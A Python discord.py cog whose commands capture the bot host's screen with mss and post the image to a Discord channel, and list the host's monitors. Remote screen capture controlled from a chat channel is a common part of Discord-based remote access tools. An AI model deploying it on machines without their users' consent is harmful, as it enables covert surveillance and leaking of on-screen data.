import os
import discord
from discord.ext import commands
import mss
import io
from datetime import datetime

class Screenshot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ss", help="Take a screenshot of the remote machine.")
    async def screenshot(self, ctx):
        try:
            with mss.mss() as sct:
                # Capture the primary monitor
                # sct.monitors[0] is all monitors combined
                # sct.monitors[1] is the first monitor
                monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                screenshot = sct.grab(monitor)
                
                # Convert to PNG in memory
                img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                
                # Prepare the file for Discord
                file_name = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                discord_file = discord.File(io.BytesIO(img_bytes), filename=file_name)
                
                await ctx.send(f"📸 Screenshot from {ctx.author.name}'s remote machine:", file=discord_file)
        except Exception as e:
            await ctx.send(f"❌ Error taking screenshot: {str(e)}")

    @commands.command(name="screens", help="List available monitors.")
    async def list_screens(self, ctx):
        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                msg = f"🖥️ **Available Monitors:** {len(monitors)-1}\n"
                for i, m in enumerate(monitors[1:], 1):
                    msg += f"Monitor {i}: {m['width']}x{m['height']} at ({m['left']}, {m['top']})\n"
                await ctx.send(msg)
        except Exception as e:
            await ctx.send(f"❌ Error listing screens: {str(e)}")

async def setup(bot):
    await bot.add_cog(Screenshot(bot))
